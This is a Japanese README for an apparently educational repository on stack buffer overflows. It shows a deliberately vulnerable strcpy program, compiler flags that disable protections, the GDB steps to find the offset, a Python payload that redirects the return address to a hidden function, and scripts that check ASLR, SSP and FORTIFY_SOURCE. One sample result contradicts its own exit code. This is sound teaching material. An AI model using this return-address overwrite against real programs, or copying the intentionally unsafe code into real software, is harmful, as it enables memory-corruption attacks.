# buffer_overflower

このリポジトリは、スタックバッファオーバーフローの脆弱性を検証するためのものです。

## 前提条件

ASLR (アドレス空間配置のランダム化):  
メモリのアドレスをランダム化する機能。`function2`のアドレスが毎回変わるため、特定のアドレスにジャンプすることが難しくなるため、無効化する必要があります。

## バッファオーバーフロー攻撃の基本: `overflow.c` と `exploit.txt` を使用して関数を呼び出す

このガイドでは、スタックベースのバッファオーバーフローの脆弱性を悪用して、通常は呼び出されない関数を呼び出す方法について説明します。

-----

### 1\. 目的

`function1` で発生する **スタックバッファオーバーフロー** を悪用して、`main` 関数から直接呼び出されない `function2` を呼び出します。

-----

### 2\. 脆弱性のある C プログラム `overflow.c` の作成

まず、意図的にバッファオーバーフローの脆弱性を持つ C 言語プログラムを作成します。

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// main 関数から直接呼び出されない関数
void function2() {
    printf("Function 2 が呼び出されました!\n");
    // 攻撃が成功した後、プログラムを正常に終了します
    // これがないと、function2 からのリターン先が無効になり、セグメンテーションフォルトが発生します
    exit(0); 
}

// バッファオーバーフローの脆弱性を持つ関数
// この関数は main から呼び出され、ペイロードが渡されます
void function1(char *input) {
    char buffer[10]; // 意図的に小さいバッファ
    printf("Function 1 に入りました。\n");
    // !!! 意図的に危険な strcpy を使用 !!!
    // input のデータが buffer のサイズ (10 バイト) を超えると、
    // スタック上の他のデータ (特にリターンアドレス) が上書きされます
    strcpy(buffer, input); 
    // この printf は、リターンアドレスが上書きされても実行される可能性があります
    printf("Function 1 は正常にリターンしました\n"); 
}

int main() {
    char input[100]; // ペイロードを読み込むためのバッファ
    printf("入力を入力してください: ");
    // 標準入力からペイロードを読み込みます
    scanf("%s", input);
    // 脆弱性のある関数を呼び出し、ペイロードを渡します
    function1(input);
    return 0;
}
```

**説明:**

* **`function2()`**:  
  この関数は `main` 関数から直接呼び出されませんが、攻撃によって呼び出したいターゲット関数です。`exit(0)` を含めることで、攻撃が成功した後のセグメンテーションフォルトを防ぎ、プログラムが正常に終了するようにします。

* **`function1(char *input)`**:  
  この関数は脆弱性の中心です。`buffer` はわずか 10 バイトですが、`strcpy` は `input` の内容をバッファサイズを超えて `buffer` にコピーします。これにより、スタック上の `function1` の **リターンアドレス** が上書きされる可能性があります。

* **`main()`**:  
  `function1` を呼び出します。

-----

### 3\. `overflow.c` のコンパイル

バッファオーバーフロー攻撃を正常に実行するには、コンパイル中に特定のセキュリティ保護を無効にする必要があります。

```bash
gcc -g -fno-stack-protector -no-pie -o overflow overflow.c
```

**コンパイルオプションの説明:**

* **`-g`**:  
  GDB (GNU Debugger) でデバッグするためのシンボル情報を含めます。これにより、変数名と関数名を使用してメモリの状態を確認できます。

* **`-fno-stack-protector`**:  
  **スタックスマッシングプロテクター (SSP)** (別名 **スタックカナリア**) を無効にします。これが有効になっている場合、バッファオーバーフローを検出し、プログラムを異常終了させます。

* **`-no-pie`**:  
  **PIE (Position Independent Executable)** を無効にします。PIE が有効になっている場合、プログラムが起動するたびにメモリアドレスがランダム化されるため、攻撃に使用するアドレスを特定することが非常に困難になります。無効にするとアドレスが固定され、攻撃が容易になります。

-----

### 4\. `exploit.txt` の作成方法

`exploit.txt` は、`function1` のリターンアドレスを `function2` のアドレスで上書きするための **ペイロード** を記述します。これには、次の情報が必要です。

1. **バッファからリターンアドレスまでのオフセット:** `function1` の `buffer` の先頭から、`function1` の終了後にリターンするアドレスが格納されているスタック上の場所までのバイト数。
2. **`function2` のアドレス:** `function2` がメモリにロードされるアドレス。

この情報は、GDB を使用してプログラムをデバッグすることで特定されます。

#### 4.1. GDB を使用してオフセットとアドレスを特定する

1. **GDB で `overflow` を起動します:**

    ```bash
    gdb -q overflow
    ```

2. **`function1` の開始時にブレークポイントを設定し、短い入力で実行します:**

    ```gdb
    (gdb) b function1
    (gdb) r
    Starting program: .../overflow
    入力を入力してください: AAAA
    ```

3. **`buffer` のアドレスを確認します:**

    ```gdb
    (gdb) p &buffer
    $1 = (char (*)[10]) 0x7fffffffd886  # 例: このアドレスは環境によって異なります
    ```

    (お使いの環境での `buffer` のアドレスをメモしてください)

4. **`function1` のスタックフレーム情報を確認し、リターンアドレスの場所を特定します:**

    ```gdb
    (gdb) info frame
    Stack level 0, frame at 0x7fffffffd8a0:
     rip = 0x4011a2 in function1 (...); saved rip = 0x4011f7 # <- これが重要です
     ...
     Saved registers:
      rbp at 0x7fffffffd890, rip at 0x7fffffffd898 # <- リターンアドレスが保存されている場所
    ```

    `Saved registers:` の `rip at` で示されるアドレスは、リターンアドレスが保存されている場所です。この例では、`0x7fffffffd898` です。

5. **オフセットを計算します:**
    `リターンアドレスの場所 - バッファのアドレス` を計算します。
    例: `0x7fffffffd898 - 0x7fffffffd886 = 18` バイト
    この **18 バイト** がお使いの環境でのオフセットです。

6. **`function2` のアドレスを確認します:**

    ```gdb
    (gdb) p function2
    $2 = {void ()} 0x401156 <function2> # 例: このアドレスは環境によって異なります
    ```

    (お使いの環境での `function2` のアドレスをメモしてください)

これで、`offset` と `function2` のアドレス (例: `0x401156`) が特定されました。

#### 4.2. Python スクリプトで `exploit.txt` を生成する

特定されたオフセットとアドレスを使用して、Python スクリプトでバイナリペイロードを生成します。

```python
import struct

# GDB で特定されたオフセットと function2 のアドレスに置き換えてください!
OFFSET = 18            # お使いの環境でのオフセット (例: 18 バイト)
FUNC2_ADDR = 0x401156  # お使いの環境での function2 のアドレス (例: 0x401156)

# ペイロードの構築:
# 1. オフセット用のダミーデータ (例: 'A')
# 2. その後に function2 のアドレス (リトルエンディアン形式で 8 バイト)
payload = b'A' * OFFSET 
payload += struct.pack('<Q', FUNC2_ADDR) # '<Q' はリトルエンディアンの符号なし long long (8 バイト)

# exploit.txt に書き込みます (バイナリモード 'wb')
with open('exploit.txt', 'wb') as f:
    f.write(payload)

print(f"ペイロードが生成されました: {len(payload)} バイト")
print(f"コンテンツ (プレビュー用の最初の 30 バイト): {payload[:30]}")
```

このスクリプトを実行すると、`exploit.txt` という名前のバイナリファイルが生成されます。

-----

### 5\. 攻撃の実行

生成された `exploit.txt` を `overflow` プログラムの標準入力にリダイレクトして実行します。

```bash
./overflow < exploit.txt
```

#### 予想される実行結果

攻撃が成功した場合、次の出力が得られるはずです。

```bash
入力を入力してください: Function 1 は正常にリターンしました
Function 2 が呼び出されました!
```

**説明:**

* `入力を入力してください:` は `main` 関数の `printf` からのものです。

* `Function 1 は正常にリターンしました` は、`function1` の `strcpy` が実行され、`printf` ステートメントが実行され、その後、上書きされたリターンアドレスに制御が渡されたことを示します。

* `Function 2 が呼び出されました!` が表示された場合、バッファオーバーフローによって `function2` が正常に呼び出されたことを意味します。その後、`function2` の `exit(0)` によりプログラムは正常に終了します。

-----

これで、`overflow.c` を使用した基本的なバッファオーバーフロー攻撃の手順は完了です。この演習を通して、スタックの仕組み、関数呼び出し規約、およびバッファオーバーフローを悪用する方法の基本を深く理解することができます。

## 各種確認ツール

### ASLR (Address Space Layout Randomization) の自動判定ツール: `check_aslr.py`

#### 1.1. 目的

`check_aslr.py` は、Linux システムで **ASLR (Address Space Layout Randomization)** が有効になっているかどうかを自動的に判定するPythonスクリプトです。ASLRは、メモリ上のプログラムのアドレスをランダム化することで、バッファオーバーフローなどの攻撃を困難にするセキュリティ機能です。

#### 1.2. 判定方法

このスクリプトは、以下の2つの方法を組み合わせてASLRの状態を判定します。

1. **`/proc/sys/kernel/randomize_va_space` の読み取り:**
      * Linuxカーネルの設定ファイルである `/proc/sys/kernel/randomize_va_space` の値を直接読み取ります。この値はASLRの有効レベルを示し、最も信頼性の高い情報源です。
          * `0`: ASLRは無効です。
          * `1`: ASLRは部分的に有効です（スタック、mmap領域、VDSOがランダム化）。
          * `2`: ASLRは完全に有効です（スタック、ヒープ、mmap領域、VDSOがすべてランダム化）。
2. **アドレスランダム化の動的確認:**
      * 非常にシンプルなC言語のテストプログラムを自動的にコンパイルし、複数回実行します。
      * 実行ごとに、プログラムの**スタックアドレス**と**ヒープアドレス**を抽出し、それらのアドレスが実行ごとに変化するかどうかを確認します。
      * アドレスが変化していればASLRは有効であると推測し、変化していなければ無効であると推測します。この方法は補助的な確認であり、環境やコンパイルオプションによっては正確な結果が得られない場合もあります。

#### 1.3. 実行方法

1. `check_aslr.py` に実行権限を付与します (任意ですが、推奨)。

    ```bash
    chmod +x check_aslr.py
    ```

2. ターミナルで実行します。

    ```bash
    python3 check_aslr.py
    ```

#### 1.4. 実行結果の例

Linux の場合:

```bash
--- /proc/sys/kernel/randomize_va_space を介した ASLR の判定 ---
'/proc/sys/kernel/randomize_va_space' の値: 2
ASLR は完全に有効です (2: 完全なランダム化、推奨)。

--- アドレスのランダム化による ASLR の推測 (5 回実行) ---
スタックアドレスのランダム化: 有効
ヒープアドレスのランダム化: 有効
アドレスのランダム化が確認されました。ASLR が有効である可能性があります。

--- 注意 ---
'/proc/sys/kernel/randomize_va_space' の値が最も信頼できる情報源です。
アドレスのランダム化のチェックは、コンパイルオプションや OS の動作によって異なる場合があります。
```

Windows の場合:

```powershell
--- /proc/sys/kernel/randomize_va_space を介した ASLR の判定 ---
エラー: '/proc/sys/kernel/randomize_va_space' が見つかりません。これは Linux システムではないか、カーネルのバージョンが古すぎる可能性があります。

--- アドレスのランダム化による ASLR の推測 (5 回実行) ---
スタックアドレスのランダム化: 有効
ヒープアドレスのランダム化: 有効
アドレスのランダム化が確認されました。ASLR が有効である可能性があります。

--- 注意 ---
'/proc/sys/kernel/randomize_va_space' の値が最も信頼できる情報源です。
アドレスのランダム化のチェックは、コンパイルオプションや OS の動作によって異なる場合があります。
```

## 2\. セキュリティ機構の有効性判定ツール: `check_security_features.py`

### 2.1. 目的

`check_security_features.py` は、**SSP (Stack Smashing Protector)** と **Automatic Fortification (FORTIFY\_SOURCE)** がシステム上で有効に機能しているかどうかを自動的に判定するPythonスクリプトです。これらの機能は、バッファオーバーフローなどのメモリ関連の脆弱性からプログラムを保護します。

### 2.2. 判定方法

このスクリプトは、意図的にバッファオーバーフローを発生させるC言語のテストプログラムを、各セキュリティ機能の有効/無効に対応するコンパイルオプションでコンパイルし、その実行結果（終了コードや標準エラー出力）を分析することで判定します。

* **SSP (Stack Smashing Protector):**
  * **有効な場合:**  
  スタック上に**カナリア値**を配置します。バッファオーバーフローによってカナリアが上書きされると、関数がリターンする前にそれを検知し、`*** stack smashing detected ***` のようなメッセージを出力してプログラムを異常終了させます（通常は`SIGABRT`、終了コード`134`）。
  * **無効な場合:**  
  カナリアが挿入されないため、バッファオーバーフローはカナリアに邪魔されることなく、**戻りアドレスなどを直接上書き**し、プログラムは通常`SIGSEGV`（終了コード`139`）でクラッシュします。

* **Automatic Fortification (FORTIFY\_SOURCE):**
  * **有効な場合:**  
  `strcpy`のような危険な関数呼び出しを、コンパイル時に**境界チェック付きの安全なバージョン**に置き換えます。これにより、バッファオーバーフローの可能性がある場所でコンパイル時に警告/エラーを出したり、実行時に`buffer overflow detected`のようなメッセージを出力してプログラムを異常終了させたりします（通常は`SIGABRT`、終了コード`134`）。
  * **無効な場合:**  
  危険な関数はそのまま使用され、境界チェックは行われません。バッファオーバーフローは通常`SIGSEGV`（終了コード`139`）でクラッシュします。

### 2.3. 実行方法

1. `check_security_features.py` に実行権限を付与します (任意ですが、推奨)。

    ```bash
    chmod +x check_security_features.py
    ```

2. ターミナルで実行します。

    ```bash
    python3 check_security_features.py
    ```

### 2.3. 実行結果の例

```bash
--- セキュリティ機構の有効性判定プログラム ---
このプログラムは、SSPとFORTIFY_SOURCEの有効性をテストします。
gccコンパイラがインストールされている必要があります。

=== SSP (Stack Smashing Protector) の判定 ===
  コンパイル中: ./ssp_enabled_test (オプション: -fstack-protector-all -no-pie)
  コンパイル成功: ./ssp_enabled_test
  実行中: ./ssp_enabled_test
  終了コード: -6
  stdout:
Program started.
Function 1 entered.
  stderr:
*** stack smashing detected ***: terminated
  結果: SSPは有効である可能性が高いです (stack smashing detectedメッセージまたはSIGABRT)。
  コンパイル中: ./ssp_disabled_test (オプション: -fno-stack-protector -no-pie)
  コンパイル成功: ./ssp_disabled_test
  実行中: ./ssp_disabled_test
  終了コード: -11
  stdout:
Program started.
Function 1 entered.
  stderr:

  結果: SSPは無効である可能性が高いです (stack smashing detectedメッセージなしでSIGSEGV)。

=== Automatic Fortification (FORTIFY_SOURCE) の判定 ===
  コンパイル中: ./fortify_enabled_test (オプション: -D_FORTIFY_SOURCE=2 -no-pie)
  コンパイル成功: ./fortify_enabled_test
  実行中: ./fortify_enabled_test
  終了コード: -11
  stdout:
Program started.
Function 1 entered.
  stderr:

  結果: FORTIFY_SOURCEは無効であるか、期待通りに検知していません (終了コード: -11)。
  コンパイル中: ./fortify_disabled_test (オプション: -no-pie)
  コンパイル成功: ./fortify_disabled_test
  実行中: ./fortify_disabled_test
  終了コード: -11
  stdout:
Program started.
Function 1 entered.
  stderr:

  結果: FORTIFY_SOURCE無効設定にもかかわらず、期待されるSIGSEGVになりませんでした (終了コード: -11)。

=== 最終判定 ===
→ **SSP (Stack Smashing Protector) は、適切に機能しているようです。**
→ **Automatic Fortification (FORTIFY_SOURCE) の状態は不明または不安定です。**
```
